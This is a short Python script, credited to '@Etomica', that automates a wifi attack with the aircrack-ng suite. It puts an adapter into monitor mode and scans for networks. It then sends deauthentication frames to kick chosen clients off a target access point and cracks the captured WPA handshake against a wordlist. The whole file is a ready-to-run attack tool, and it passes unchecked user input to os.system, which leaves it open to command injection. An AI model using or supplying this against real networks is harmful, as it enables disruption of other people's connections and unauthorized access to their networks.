#Script by @Etomica
import os

def execute_command(command):
    print(f"Executing: {command}")
    os.system(command)

# Display available wireless interfaces
execute_command("airmon-ng")
print()

# Ask the user if they want to change the wifi adapter
wifi_mod_change = input("This is your set wifi adapter, change it? (y/n): ").strip().lower()
wifi_module = "wlan0"

if wifi_mod_change == "y":
    execute_command("iwconfig")
    print()
    wifi_module = input("Choose your wifi module: ").strip()

# Start the selected wifi module in monitor mode
execute_command(f"airmon-ng start {wifi_module}")
wifi_module_mon = f"{wifi_module}mon"

# Scan for available networks
execute_command(f"airodump-ng {wifi_module_mon}")

# Prompt user for the target BSSID
target_bssid = input("Enter the target access point BSSID: ").strip()
target_client_count = int(input("Enter the number of clients to deauth: ").strip())

# Deauthenticate specified clients
for _ in range(target_client_count):
    target_client = input("Enter the MAC Address of the client you want to deauth: ").strip()
    execute_command(f"aireplay-ng -0 1 -a {target_bssid} -c {target_client} {wifi_module_mon}")

# Crack the captured handshake
wordlist = input("Enter the path to your wordlist file: ").strip()
handshake_file = input("Enter the path to your handshake file: ").strip()
execute_command(f"aircrack-ng -w {wordlist} -b {target_bssid} {handshake_file}")